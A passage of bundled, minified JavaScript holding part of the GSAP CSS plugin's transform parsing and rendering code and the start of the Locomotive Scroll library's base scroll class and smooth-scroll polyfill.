          clearProps: function (t, e, i, n, r) {
            if ("isFromStart" !== r.data) {
              var s = t._pt = new fi(t._pt, e, i, 0, 0, Sn);
              return s.u = n, s.pr = -10, s.tween = r, t._props.push(i), 1
            }
          }
        },
        En = [1, 0, 0, 1, 0, 0],
        Mn = {},
        On = function (t) {
          return "matrix(1, 0, 0, 1, 0, 0)" === t || "none" === t || !t
        },
        An = function (t) {
          var e = ln(t, tn);
          return On(e) ? En : e.substr(7).match(j).map(vt)
        },
        Cn = function (t, e) {
          var i, n, r, s, o = t._gsap || dt(t),
            a = t.style,
            l = An(t);
          return o.svg && t.getAttribute("transform") ? "1,0,0,1,0,0" === (l = [(r = t.transform.baseVal.consolidate().matrix).a, r.b, r.c, r.d, r.e, r.f]).join(",") ? En : l : (l !== En || t.offsetParent || t === Oi || o.svg || (r = a.display, a.display = "block", (i = t.parentNode) && t.offsetParent || (s = 1, n = t.nextElementSibling, Oi.appendChild(t)), l = An(t), r ? a.display = r : vn(t, "display"), s && (n ? i.insertBefore(t, n) : i ? i.appendChild(t) : Oi.removeChild(t))), e && l.length > 6 ? [l[0], l[1], l[4], l[5], l[12], l[13]] : l)
        },
        Dn = function (t, e, i, n, r, s) {
          var o, a, l, c = t._gsap,
            h = r || Cn(t, !0),
            u = c.xOrigin || 0,
            f = c.yOrigin || 0,
            d = c.xOffset || 0,
            p = c.yOffset || 0,
            m = h[0],
            v = h[1],
            g = h[2],
            y = h[3],
            _ = h[4],
            b = h[5],
            w = e.split(" "),
            x = parseFloat(w[0]) || 0,
            T = parseFloat(w[1]) || 0;
          i ? h !== En && (a = m * y - v * g) && (l = x * (-v / a) + T * (m / a) - (m * b - v * _) / a, x = x * (y / a) + T * (-g / a) + (g * b - y * _) / a, T = l) : (x = (o = pn(t)).x + (~w[0].indexOf("%") ? x / 100 * o.width : x), T = o.y + (~(w[1] || w[0]).indexOf("%") ? T / 100 * o.height : T)), n || !1 !== n && c.smooth ? (_ = x - u, b = T - f, c.xOffset = d + (_ * m + b * g) - _, c.yOffset = p + (_ * v + b * y) - b) : c.xOffset = c.yOffset = 0, c.xOrigin = x, c.yOrigin = T, c.smooth = !!n, c.origin = e, c.originIsAbsolute = !!i, t.style[en] = "0px 0px", s && (gn(s, c, "xOrigin", u, x), gn(s, c, "yOrigin", f, T), gn(s, c, "xOffset", d, c.xOffset), gn(s, c, "yOffset", p, c.yOffset)), t.setAttribute("data-svg-origin", x + " " + T)
        },
        Pn = function (t, e) {
          var i = t._gsap || new Fe(t);
          if ("x" in i && !e && !i.uncache) return i;
          var n, r, s, o, a, l, c, h, u, f, d, p, m, v, g, y, _, b, x, T, S, k, E, M, O, A, C, D, P, L, R, B, I = t.style,
            z = i.scaleX < 0,
            Y = "px",
            F = "deg",
            X = getComputedStyle(t),
            H = ln(t, en) || "0";
          return n = r = s = l = c = h = u = f = d = 0, o = a = 1, i.svg = !(!t.getCTM || !mn(t)), X.translate && ("none" === X.translate && "none" === X.scale && "none" === X.rotate || (I[tn] = ("none" !== X.translate ? "translate3d(" + (X.translate + " 0 0").split(" ").slice(0, 3).join(", ") + ") " : "") + ("none" !== X.rotate ? "rotate(" + X.rotate + ") " : "") + ("none" !== X.scale ? "scale(" + X.scale.split(" ").join(",") + ") " : "") + ("none" !== X[tn] ? X[tn] : "")), I.scale = I.rotate = I.translate = "none"), v = Cn(t, i.svg), i.svg && (i.uncache ? (O = t.getBBox(), H = i.xOrigin - O.x + "px " + (i.yOrigin - O.y) + "px", M = "") : M = !e && t.getAttribute("data-svg-origin"), Dn(t, M || H, !!M || i.originIsAbsolute, !1 !== i.smooth, v)), p = i.xOrigin || 0, m = i.yOrigin || 0, v !== En && (b = v[0], x = v[1], T = v[2], S = v[3], n = k = v[4], r = E = v[5], 6 === v.length ? (o = Math.sqrt(b * b + x * x), a = Math.sqrt(S * S + T * T), l = b || x ? zi(x, b) * Bi : 0, (u = T || S ? zi(T, S) * Bi + l : 0) && (a *= Math.abs(Math.cos(u * Ii))), i.svg && (n -= p - (p * b + m * T), r -= m - (p * x + m * S))) : (B = v[6], L = v[7], C = v[8], D = v[9], P = v[10], R = v[11], n = v[12], r = v[13], s = v[14], c = (g = zi(B, P)) * Bi, g && (M = k * (y = Math.cos(-g)) + C * (_ = Math.sin(-g)), O = E * y + D * _, A = B * y + P * _, C = k * -_ + C * y, D = E * -_ + D * y, P = B * -_ + P * y, R = L * -_ + R * y, k = M, E = O, B = A), h = (g = zi(-T, P)) * Bi, g && (y = Math.cos(-g), R = S * (_ = Math.sin(-g)) + R * y, b = M = b * y - C * _, x = O = x * y - D * _, T = A = T * y - P * _), l = (g = zi(x, b)) * Bi, g && (M = b * (y = Math.cos(g)) + x * (_ = Math.sin(g)), O = k * y + E * _, x = x * y - b * _, E = E * y - k * _, b = M, k = O), c && Math.abs(c) + Math.abs(l) > 359.9 && (c = l = 0, h = 180 - h), o = vt(Math.sqrt(b * b + x * x + T * T)), a = vt(Math.sqrt(E * E + B * B)), g = zi(k, E), u = Math.abs(g) > 2e-4 ? g * Bi : 0, d = R ? 1 / (R < 0 ? -R : R) : 0), i.svg && (M = t.getAttribute("transform"), i.forceCSS = t.setAttribute("transform", "") || !On(ln(t, tn)), M && t.setAttribute("transform", M))), Math.abs(u) > 90 && Math.abs(u) < 270 && (z ? (o *= -1, u += l <= 0 ? 180 : -180, l += l <= 0 ? 180 : -180) : (a *= -1, u += u <= 0 ? 180 : -180)), e = e || i.uncache, i.x = n - ((i.xPercent = n && (!e && i.xPercent || (Math.round(t.offsetWidth / 2) === Math.round(-n) ? -50 : 0))) ? t.offsetWidth * i.xPercent / 100 : 0) + Y, i.y = r - ((i.yPercent = r && (!e && i.yPercent || (Math.round(t.offsetHeight / 2) === Math.round(-r) ? -50 : 0))) ? t.offsetHeight * i.yPercent / 100 : 0) + Y, i.z = s + Y, i.scaleX = vt(o), i.scaleY = vt(a), i.rotation = vt(l) + F, i.rotationX = vt(c) + F, i.rotationY = vt(h) + F, i.skewX = u + F, i.skewY = f + F, i.transformPerspective = d + Y, (i.zOrigin = parseFloat(H.split(" ")[2]) || 0) && (I[en] = Ln(H)), i.xOffset = i.yOffset = 0, i.force3D = w.force3D, i.renderTransform = i.svg ? Xn : Li ? Fn : Bn, i.uncache = 0, i
        },
        Ln = function (t) {
          return (t = t.split(" "))[0] + " " + t[1]
        },
        Rn = function (t, e, i) {
          var n = te(e);
          return vt(parseFloat(e) + parseFloat(bn(t, "x", i + "px", n))) + n
        },
        Bn = function (t, e) {
          e.z = "0px", e.rotationY = e.rotationX = "0deg", e.force3D = 0, Fn(t, e)
        },
        In = "0deg",
        zn = "0px",
        Yn = ") ",
        Fn = function (t, e) {
          var i = e || this,
            n = i.xPercent,
            r = i.yPercent,
            s = i.x,
            o = i.y,
            a = i.z,
            l = i.rotation,
            c = i.rotationY,
            h = i.rotationX,
            u = i.skewX,
            f = i.skewY,
            d = i.scaleX,
            p = i.scaleY,
            m = i.transformPerspective,
            v = i.force3D,
            g = i.target,
            y = i.zOrigin,
            _ = "",
            b = "auto" === v && t && 1 !== t || !0 === v;
          if (y && (h !== In || c !== In)) {
            var w, x = parseFloat(c) * Ii,
              T = Math.sin(x),
              S = Math.cos(x);
            x = parseFloat(h) * Ii, w = Math.cos(x), s = Rn(g, s, T * w * -y), o = Rn(g, o, -Math.sin(x) * -y), a = Rn(g, a, S * w * -y + y)
          }
          m !== zn && (_ += "perspective(" + m + Yn), (n || r) && (_ += "translate(" + n + "%, " + r + "%) "), (b || s !== zn || o !== zn || a !== zn) && (_ += a !== zn || b ? "translate3d(" + s + ", " + o + ", " + a + ") " : "translate(" + s + ", " + o + Yn), l !== In && (_ += "rotate(" + l + Yn), c !== In && (_ += "rotateY(" + c + Yn), h !== In && (_ += "rotateX(" + h + Yn), u === In && f === In || (_ += "skew(" + u + ", " + f + Yn), 1 === d && 1 === p || (_ += "scale(" + d + ", " + p + Yn), g.style[tn] = _ || "translate(0, 0)"
        },
        Xn = function (t, e) {
          var i, n, r, s, o, a = e || this,
            l = a.xPercent,
            c = a.yPercent,
            h = a.x,
            u = a.y,
            f = a.rotation,
            d = a.skewX,
            p = a.skewY,
            m = a.scaleX,
            v = a.scaleY,
            g = a.target,
            y = a.xOrigin,
            _ = a.yOrigin,
            b = a.xOffset,
            w = a.yOffset,
            x = a.forceCSS,
            T = parseFloat(h),
            S = parseFloat(u);
          f = parseFloat(f), d = parseFloat(d), (p = parseFloat(p)) && (d += p = parseFloat(p), f += p), f || d ? (f *= Ii, d *= Ii, i = Math.cos(f) * m, n = Math.sin(f) * m, r = Math.sin(f - d) * -v, s = Math.cos(f - d) * v, d && (p *= Ii, o = Math.tan(d - p), r *= o = Math.sqrt(1 + o * o), s *= o, p && (o = Math.tan(p), i *= o = Math.sqrt(1 + o * o), n *= o)), i = vt(i), n = vt(n), r = vt(r), s = vt(s)) : (i = m, s = v, n = r = 0), (T && !~(h + "").indexOf("px") || S && !~(u + "").indexOf("px")) && (T = bn(g, "x", h, "px"), S = bn(g, "y", u, "px")), (y || _ || b || w) && (T = vt(T + y - (y * i + _ * r) + b), S = vt(S + _ - (y * n + _ * s) + w)), (l || c) && (o = g.getBBox(), T = vt(T + l / 100 * o.width), S = vt(S + c / 100 * o.height)), o = "matrix(" + i + "," + n + "," + r + "," + s + "," + T + "," + S + ")", g.setAttribute("transform", o), x && (g.style[tn] = o)
        },
        Hn = function (t, e, i, n, r) {
          var s, o, a = 360,
            l = D(r),
            c = parseFloat(r) * (l && ~r.indexOf("rad") ? Bi : 1) - n,
            h = n + c + "deg";
          return l && ("short" === (s = r.split("_")[1]) && (c %= a) != c % 180 && (c += c < 0 ? a : -360), "cw" === s && c < 0 ? c = (c + 36e9) % a - ~~(c / a) * a : "ccw" === s && c > 0 && (c = (c - 36e9) % a - ~~(c / a) * a)), t._pt = o = new fi(t._pt, e, i, n, c, Wi), o.e = h, o.u = "deg", t._props.push(i), o
        },
        jn = function (t, e) {
          for (var i in e) t[i] = e[i];
          return t
        },
        Wn = function (t, e, i) {
          var n, r, s, o, a, l, c, h = jn({}, i._gsap),
            u = i.style;
          for (r in h.svg ? (s = i.getAttribute("transform"), i.setAttribute("transform", ""), u[tn] = e, n = Pn(i, 1), vn(i, tn), i.setAttribute("transform", s)) : (s = getComputedStyle(i)[tn], u[tn] = e, n = Pn(i, 1), u[tn] = s), Ri)(s = h[r]) !== (o = n[r]) && "perspective,force3D,transformOrigin,svgOrigin".indexOf(r) < 0 && (a = te(s) !== (c = te(o)) ? bn(i, r, s, c) : parseFloat(s), l = parseFloat(o), t._pt = new fi(t._pt, n, r, a, l - a, ji), t._pt.u = c || 0, t._props.push(r));
          jn(n, h)
        };
      mt("padding,margin,Width,Radius", (function (t, e) {
        var i = "Top",
          n = "Right",
          r = "Bottom",
          s = "Left",
          o = (e < 3 ? [i, n, r, s] : [i + s, i + n, r + n, r + s]).map((function (i) {
            return e < 2 ? t + i : "border" + i + t
          }));
        kn[e > 1 ? "border" + t : t] = function (t, e, i, n, r) {
          var s, a;
          if (arguments.length < 4) return s = o.map((function (e) {
            return wn(t, e, i)
          })), 5 === (a = s.join(" ")).split(s[0]).length ? s[0] : a;
          s = (n + "").split(" "), a = {}, o.forEach((function (t, e) {
            return a[t] = s[e] = s[e] || s[(e - 1) / 2 | 0]
          })), t.init(e, a, r)
        }
      }));
      var Vn, Nn, qn = {
        name: "css",
        register: un,
        targetTest: function (t) {
          return t.style && t.nodeType
        },
        init: function (t, e, i, n, r) {
          var s, o, a, l, c, h, u, f, d, p, m, v, g, y, _, b, x, T, S, k, E = this._props,
            M = t.style,
            O = i.vars.startAt;
          for (u in Ai || un(), this.styles = this.styles || on(t), b = this.styles.props, this.tween = i, e)
            if ("autoRound" !== u && (o = e[u], !at[u] || !qe(u, e, i, n, t, r)))
              if (c = ki(o), h = kn[u], "function" === c && (c = ki(o = o.call(i, n, t, r))), "string" === c && ~o.indexOf("random(") && (o = ue(o)), h) h(this, t, u, o, i) && (_ = 1);
              else if ("--" === u.substr(0, 2)) s = (getComputedStyle(t).getPropertyValue(u) + "").trim(), o += "", Te.lastIndex = 0, Te.test(s) || (f = te(s), d = te(o)), d ? f !== d && (s = bn(t, u, s, d) + d) : f && (o += f), this.add(M, "setProperty", s, o, n, r, 0, 0, u), E.push(u), b.push(u, 0, M[u]);
          else if ("undefined" !== c) {
            if (O && u in O ? (s = "function" == typeof O[u] ? O[u].call(i, n, t, r) : O[u], D(s) && ~s.indexOf("random(") && (s = ue(s)), te(s + "") || (s += w.units[u] || te(wn(t, u)) || ""), "=" === (s + "").charAt(1) && (s = wn(t, u))) : s = wn(t, u), l = parseFloat(s), (p = "string" === c && "=" === o.charAt(1) && o.substr(0, 2)) && (o = o.substr(2)), a = parseFloat(o), u in Hi && ("autoAlpha" === u && (1 === l && "hidden" === wn(t, "visibility") && a && (l = 0), b.push("visibility", 0, M.visibility), gn(this, M, "visibility", l ? "inherit" : "hidden", a ? "inherit" : "hidden", !a)), "scale" !== u && "transform" !== u && ~(u = Hi[u]).indexOf(",") && (u = u.split(",")[0])), m = u in Ri)
              if (this.styles.save(u), v || ((g = t._gsap).renderTransform && !e.parseTransform || Pn(t, e.parseTransform), y = !1 !== e.smoothOrigin && g.smooth, (v = this._pt = new fi(this._pt, M, tn, 0, 1, g.renderTransform, g, 0, -1)).dep = 1), "scale" === u) this._pt = new fi(this._pt, g, "scaleY", l, (p ? yt(l, p + a) : a) - l || 0, ji), this._pt.u = 0, E.push("scaleY", u), u += "X";
              else {
                if ("transformOrigin" === u) {
                  b.push(en, 0, M[en]), T = void 0, S = void 0, k = void 0, S = (T = (x = o).split(" "))[0], k = T[1] || "50%", "top" !== S && "bottom" !== S && "left" !== k && "right" !== k || (x = S, S = k, k = x), T[0] = Tn[S] || S, T[1] = Tn[k] || k, o = T.join(" "), g.svg ? Dn(t, o, 0, y, 0, this) : ((d = parseFloat(o.split(" ")[2]) || 0) !== g.zOrigin && gn(this, g, "zOrigin", g.zOrigin, d), gn(this, M, u, Ln(s), Ln(o)));
                  continue
                }
                if ("svgOrigin" === u) {
                  Dn(t, o, 1, y, 0, this);
                  continue
                }
                if (u in Mn) {
                  Hn(this, g, u, l, p ? yt(l, p + o) : o);
                  continue
                }
                if ("smoothOrigin" === u) {
                  gn(this, g, "smooth", g.smooth, o);
                  continue
                }
                if ("force3D" === u) {
                  g[u] = o;
                  continue
                }
                if ("transform" === u) {
                  Wn(this, o, t);
                  continue
                }
              }
            else u in M || (u = hn(u) || u);
            if (m || (a || 0 === a) && (l || 0 === l) && !Xi.test(o) && u in M) a || (a = 0), (f = (s + "").substr((l + "").length)) !== (d = te(o) || (u in w.units ? w.units[u] : f)) && (l = bn(t, u, s, d)), this._pt = new fi(this._pt, m ? g : M, u, l, (p ? yt(l, p + a) : a) - l, m || "px" !== d && "zIndex" !== u || !1 === e.autoRound ? ji : Ni), this._pt.u = d || 0, f !== d && "%" !== d && (this._pt.b = s, this._pt.r = Vi);
            else if (u in M) xn.call(this, t, u, s, p ? p + o : o);
            else {
              if (!(u in t)) {
                Q(u, o);
                continue
              }
              this.add(t, u, s || t[u], p ? p + o : o, n, r)
            }
            m || (u in M ? b.push(u, 0, M[u]) : b.push(u, 1, s || t[u])), E.push(u)
          }
          _ && ui(this)
        },
        render: function (t, e) {
          if (e.tween._time || !Pi())
            for (var i = e._pt; i;) i.r(t, i.d), i = i._next;
          else e.styles.revert()
        },
        get: wn,
        aliases: Hi,
        getSetter: function (t, e, i) {
          var n = Hi[e];
          return n && n.indexOf(",") < 0 && (e = n), e in Ri && e !== en && (t._gsap.x || wn(t, "x")) ? i && Di === i ? "scale" === e ? Qi : Zi : (Di = i || {}) && ("scale" === e ? $i : Ji) : t.style && !R(t.style[e]) ? Gi : ~e.indexOf("-") ? Ki : ni(t, e)
        },
        core: {
          _removeProperty: vn,
          _getMatrix: Cn
        }
      };
      Si.utils.checkPrefix = hn, Si.core.getStyleSaver = on, Nn = mt("x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + (Vn = "rotation,rotationX,rotationY,skewX,skewY") + ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective", (function (t) {
        Ri[t] = 1
      })), mt(Vn, (function (t) {
        w.units[t] = "deg", Mn[t] = 1
      })), Hi[Nn[13]] = "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + Vn, mt("0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY", (function (t) {
        var e = t.split(":");
        Hi[e[1]] = Nn[e[0]]
      })), mt("x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective", (function (t) {
        w.units[t] = "px"
      })), Si.registerPlugin(qn);
      var Un = Si.registerPlugin(qn) || Si;
      Un.core.Tween
    },
    768: function (t, e, i) {
      function n(t) {
        return (n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
          return typeof t
        } : function (t) {
          return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
        })(t)
      }

      function r(t, e) {
        if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function")
      }

      function s(t, e) {
        for (var i = 0; i < e.length; i++) {
          var n = e[i];
          n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(t, n.key, n)
        }
      }

      function o(t, e, i) {
        return e && s(t.prototype, e), i && s(t, i), t
      }

      function a(t, e, i) {
        return e in t ? Object.defineProperty(t, e, {
          value: i,
          enumerable: !0,
          configurable: !0,
          writable: !0
        }) : t[e] = i, t
      }

      function l(t, e) {
        var i = Object.keys(t);
        if (Object.getOwnPropertySymbols) {
          var n = Object.getOwnPropertySymbols(t);
          e && (n = n.filter((function (e) {
            return Object.getOwnPropertyDescriptor(t, e).enumerable
          }))), i.push.apply(i, n)
        }
        return i
      }

      function c(t) {
        for (var e = 1; e < arguments.length; e++) {
          var i = null != arguments[e] ? arguments[e] : {};
          e % 2 ? l(Object(i), !0).forEach((function (e) {
            a(t, e, i[e])
          })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(i)) : l(Object(i)).forEach((function (e) {
            Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(i, e))
          }))
        }
        return t
      }

      function h(t, e) {
        if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
        t.prototype = Object.create(e && e.prototype, {
          constructor: {
            value: t,
            writable: !0,
            configurable: !0
          }
        }), e && f(t, e)
      }

      function u(t) {
        return (u = Object.setPrototypeOf ? Object.getPrototypeOf : function (t) {
          return t.__proto__ || Object.getPrototypeOf(t)
        })(t)
      }

      function f(t, e) {
        return (f = Object.setPrototypeOf || function (t, e) {
          return t.__proto__ = e, t
        })(t, e)
      }

      function d(t) {
        if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return t
      }

      function p(t, e) {
        return !e || "object" !== n(e) && "function" != typeof e ? d(t) : e
      }

      function m(t) {
        var e = function () {
          if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
          if (Reflect.construct.sham) return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return Date.prototype.toString.call(Reflect.construct(Date, [], (function () {}))), !0
          } catch (t) {
            return !1
          }
        }();
        return function () {
          var i, n = u(t);
          if (e) {
            var r = u(this).constructor;
            i = Reflect.construct(n, arguments, r)
          } else i = n.apply(this, arguments);
          return p(this, i)
        }
      }

      function v(t, e, i) {
        return (v = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function (t, e, i) {
          var n = function (t, e) {
            for (; !Object.prototype.hasOwnProperty.call(t, e) && null !== (t = u(t)););
            return t
          }(t, e);
          if (n) {
            var r = Object.getOwnPropertyDescriptor(n, e);
            return r.get ? r.get.call(i) : r.value
          }
        })(t, e, i || t)
      }

      function g(t, e) {
        return function (t) {
          if (Array.isArray(t)) return t
        }(t) || function (t, e) {
          if ("undefined" != typeof Symbol && Symbol.iterator in Object(t)) {
            var i = [],
              n = !0,
              r = !1,
              s = void 0;
            try {
              for (var o, a = t[Symbol.iterator](); !(n = (o = a.next()).done) && (i.push(o.value), !e || i.length !== e); n = !0);
            } catch (t) {
              r = !0, s = t
            } finally {
              try {
                n || null == a.return || a.return()
              } finally {
                if (r) throw s
              }
            }
            return i
          }
        }(t, e) || _(t, e) || function () {
          throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
        }()
      }

      function y(t) {
        return function (t) {
          if (Array.isArray(t)) return b(t)
        }(t) || function (t) {
          if ("undefined" != typeof Symbol && Symbol.iterator in Object(t)) return Array.from(t)
        }(t) || _(t) || function () {
          throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
        }()
      }

      function _(t, e) {
        if (t) {
          if ("string" == typeof t) return b(t, e);
          var i = Object.prototype.toString.call(t).slice(8, -1);
          return "Object" === i && t.constructor && (i = t.constructor.name), "Map" === i || "Set" === i ? Array.from(t) : "Arguments" === i || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i) ? b(t, e) : void 0
        }
      }

      function b(t, e) {
        (null == e || e > t.length) && (e = t.length);
        for (var i = 0, n = new Array(e); i < e; i++) n[i] = t[i];
        return n
      }
      var w = {
          el: document,
          name: "scroll",
          offset: [0, 0],
          repeat: !1,
          smooth: !1,
          initPosition: {
            x: 0,
            y: 0
          },
          direction: "vertical",
          gestureDirection: "vertical",
          reloadOnContextChange: !1,
          lerp: .1,
          class: "is-inview",
          scrollbarContainer: !1,
          scrollbarClass: "c-scrollbar",
          scrollingClass: "has-scroll-scrolling",
          draggingClass: "has-scroll-dragging",
          smoothClass: "has-scroll-smooth",
          initClass: "has-scroll-init",
          getSpeed: !1,
          getDirection: !1,
          scrollFromAnywhere: !1,
          multiplier: 1,
          firefoxMultiplier: 50,
          touchMultiplier: 2,
          resetNativeScroll: !0,
          tablet: {
            smooth: !1,
            direction: "vertical",
            gestureDirection: "vertical",
            breakpoint: 1024
          },
          smartphone: {
            smooth: !1,
            direction: "vertical",
            gestureDirection: "vertical"
          }
        },
        x = function () {
          function t() {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            r(this, t), Object.assign(this, w, e), this.smartphone = w.smartphone, e.smartphone && Object.assign(this.smartphone, e.smartphone), this.tablet = w.tablet, e.tablet && Object.assign(this.tablet, e.tablet), this.namespace = "locomotive", this.html = document.documentElement, this.windowHeight = window.innerHeight, this.windowWidth = window.innerWidth, this.windowMiddle = {
              x: this.windowWidth / 2,
              y: this.windowHeight / 2
            }, this.els = {}, this.currentElements = {}, this.listeners = {}, this.hasScrollTicking = !1, this.hasCallEventSet = !1, this.checkScroll = this.checkScroll.bind(this), this.checkResize = this.checkResize.bind(this), this.checkEvent = this.checkEvent.bind(this), this.instance = {
              scroll: {
                x: 0,
                y: 0
              },
              limit: {
                x: this.html.offsetWidth,
                y: this.html.offsetHeight
              },
              currentElements: this.currentElements
            }, this.isMobile ? this.isTablet ? this.context = "tablet" : this.context = "smartphone" : this.context = "desktop", this.isMobile && (this.direction = this[this.context].direction), "horizontal" === this.direction ? this.directionAxis = "x" : this.directionAxis = "y", this.getDirection && (this.instance.direction = null), this.getDirection && (this.instance.speed = 0), this.html.classList.add(this.initClass), window.addEventListener("resize", this.checkResize, !1)
          }
          return o(t, [{
            key: "init",
            value: function () {
              this.initEvents()
            }
          }, {
            key: "checkScroll",
            value: function () {
              this.dispatchScroll()
            }
          }, {
            key: "checkResize",
            value: function () {
              var t = this;
              this.resizeTick || (this.resizeTick = !0, requestAnimationFrame((function () {
                t.resize(), t.resizeTick = !1
              })))
            }
          }, {
            key: "resize",
            value: function () {}
          }, {
            key: "checkContext",
            value: function () {
              if (this.reloadOnContextChange) {
                this.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || "MacIntel" === navigator.platform && navigator.maxTouchPoints > 1 || this.windowWidth < this.tablet.breakpoint, this.isTablet = this.isMobile && this.windowWidth >= this.tablet.breakpoint;
                var t = this.context;
                this.isMobile ? this.isTablet ? this.context = "tablet" : this.context = "smartphone" : this.context = "desktop", t != this.context && ("desktop" == t ? this.smooth : this[t].smooth) != ("desktop" == this.context ? this.smooth : this[this.context].smooth) && window.location.reload()
              }
            }
          }, {
            key: "initEvents",
            value: function () {
              var t = this;
              this.scrollToEls = this.el.querySelectorAll("[data-".concat(this.name, "-to]")), this.setScrollTo = this.setScrollTo.bind(this), this.scrollToEls.forEach((function (e) {
                e.addEventListener("click", t.setScrollTo, !1)
              }))
            }
          }, {
            key: "setScrollTo",
            value: function (t) {
              t.preventDefault(), this.scrollTo(t.currentTarget.getAttribute("data-".concat(this.name, "-href")) || t.currentTarget.getAttribute("href"), {
                offset: t.currentTarget.getAttribute("data-".concat(this.name, "-offset"))
              })
            }
          }, {
            key: "addElements",
            value: function () {}
          }, {
            key: "detectElements",
            value: function (t) {
              var e = this,
                i = this.instance.scroll.y,
                n = i + this.windowHeight,
                r = this.instance.scroll.x,
                s = r + this.windowWidth;
              Object.entries(this.els).forEach((function (o) {
                var a = g(o, 2),
                  l = a[0],
                  c = a[1];
                if (!c || c.inView && !t || ("horizontal" === e.direction ? s >= c.left && r < c.right && e.setInView(c, l) : n >= c.top && i < c.bottom && e.setInView(c, l)), c && c.inView)
                  if ("horizontal" === e.direction) {
                    var h = c.right - c.left;
                    c.progress = (e.instance.scroll.x - (c.left - e.windowWidth)) / (h + e.windowWidth), (s < c.left || r > c.right) && e.setOutOfView(c, l)
                  } else {
                    var u = c.bottom - c.top;
                    c.progress = (e.instance.scroll.y - (c.top - e.windowHeight)) / (u + e.windowHeight), (n < c.top || i > c.bottom) && e.setOutOfView(c, l)
                  }
              })), this.hasScrollTicking = !1
            }
          }, {
            key: "setInView",
            value: function (t, e) {
              this.els[e].inView = !0, t.el.classList.add(t.class), this.currentElements[e] = t, t.call && this.hasCallEventSet && (this.dispatchCall(t, "enter"), t.repeat || (this.els[e].call = !1))
            }
          }, {
            key: "setOutOfView",
            value: function (t, e) {
              var i = this;
              this.els[e].inView = !1, Object.keys(this.currentElements).forEach((function (t) {
                t === e && delete i.currentElements[t]
              })), t.call && this.hasCallEventSet && this.dispatchCall(t, "exit"), t.repeat && t.el.classList.remove(t.class)
            }
          }, {
            key: "dispatchCall",
            value: function (t, e) {
              this.callWay = e, this.callValue = t.call.split(",").map((function (t) {
                return t.trim()
              })), this.callObj = t, 1 == this.callValue.length && (this.callValue = this.callValue[0]);
              var i = new Event(this.namespace + "call");
              this.el.dispatchEvent(i)
            }
          }, {
            key: "dispatchScroll",
            value: function () {
              var t = new Event(this.namespace + "scroll");
              this.el.dispatchEvent(t)
            }
          }, {
            key: "setEvents",
            value: function (t, e) {
              this.listeners[t] || (this.listeners[t] = []);
              var i = this.listeners[t];
              i.push(e), 1 === i.length && this.el.addEventListener(this.namespace + t, this.checkEvent, !1), "call" === t && (this.hasCallEventSet = !0, this.detectElements(!0))
            }
          }, {
            key: "unsetEvents",
            value: function (t, e) {
              if (this.listeners[t]) {
                var i = this.listeners[t],
                  n = i.indexOf(e);
                n < 0 || (i.splice(n, 1), 0 === i.index && this.el.removeEventListener(this.namespace + t, this.checkEvent, !1))
              }
            }
          }, {
            key: "checkEvent",
            value: function (t) {
              var e = this,
                i = t.type.replace(this.namespace, ""),
                n = this.listeners[i];
              n && 0 !== n.length && n.forEach((function (t) {
                switch (i) {
                  case "scroll":
                    return t(e.instance);
                  case "call":
                    return t(e.callValue, e.callWay, e.callObj);
                  default:
                    return t()
                }
              }))
            }
          }, {
            key: "startScroll",
            value: function () {}
          }, {
            key: "stopScroll",
            value: function () {}
          }, {
            key: "setScroll",
            value: function (t, e) {
              this.instance.scroll = {
                x: 0,
                y: 0
              }
            }
          }, {
            key: "destroy",
            value: function () {
              var t = this;
              window.removeEventListener("resize", this.checkResize, !1), Object.keys(this.listeners).forEach((function (e) {
                t.el.removeEventListener(t.namespace + e, t.checkEvent, !1)
              })), this.listeners = {}, this.scrollToEls.forEach((function (e) {
                e.removeEventListener("click", t.setScrollTo, !1)
              })), this.html.classList.remove(this.initClass)
            }
          }]), t
        }(),
        T = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : void 0 !== i.g ? i.g : "undefined" != typeof self ? self : {};

      function S(t, e) {
        return t(e = {
          exports: {}
        }, e.exports), e.exports
      }
      var k = S((function (t, e) {
          t.exports = {
            polyfill: function () {
              var t = window,
                e = document;
              if (!("scrollBehavior" in e.documentElement.style) || !0 === t.__forceSmoothScrollPolyfill__) {
                var i, r = t.HTMLElement || t.Element,
                  s = {
                    scroll: t.scroll || t.scrollTo,
                    scrollBy: t.scrollBy,
                    elementScroll: r.prototype.scroll || l,
                    scrollIntoView: r.prototype.scrollIntoView
                  },
                  o = t.performance && t.performance.now ? t.performance.now.bind(t.performance) : Date.now,
                  a = (i = t.navigator.userAgent, new RegExp(["MSIE ", "Trident/", "Edge/"].join("|")).test(i) ? 1 : 0);
                t.scroll = t.scrollTo = function () {
